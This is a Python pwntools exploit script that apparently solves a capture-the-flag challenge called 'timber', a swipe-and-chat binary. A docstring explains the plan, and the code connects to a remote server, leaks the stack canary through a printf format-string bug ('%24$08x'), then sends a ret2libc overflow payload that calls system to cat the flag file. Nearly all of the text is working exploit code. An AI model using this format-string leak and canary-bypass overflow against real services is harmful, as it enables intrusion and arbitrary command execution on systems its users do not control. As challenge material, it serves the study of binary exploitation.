"""
    
This program basically get your name and until You super Swipe you will need to swipe left or right.
Is you super Swipe then u will be able to chat and after you typed something the program will end.


    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    
    
There is canary. But inside the code there is a printf(user_input) so we can leak the canary.
after we got the canary we will send 's' to super like with someone and then we are able to overflow
on the chat. We will do a ret2libc

Buffer:

[JUNK][CANARY][JUNK][SYSTEM][JUNK][ADDR of /bin/cat ./flag]

"""

from pwn import *

r = remote('18.222.250.47', 12345)
e = ELF('./timber')
print r.recvline()
print r.recvline()
print r.recv(100)


payload_printf = "%24$08x"
r.sendline(payload_printf)
print r.recv(100)
test = r.recv(400)
hexvalue1 = int(test[0:2], 16)
hexvalue2 = int(test[2:4], 16)
hexvalue3 = int(test[4:6], 16)
hexvalue4 = int(test[6:8], 16)

r.sendline('s')
print r.recv(400)
print r.recv(400)
canary = chr(hexvalue4) + chr(hexvalue3) + chr(hexvalue2) + chr(hexvalue1)

payload = fit({ 48: canary,
		60: e.plt.system,
		68: p32(0x08048ba0)
		},)

r.sendline(payload)
print r.recv(400)
print r.recv(400)
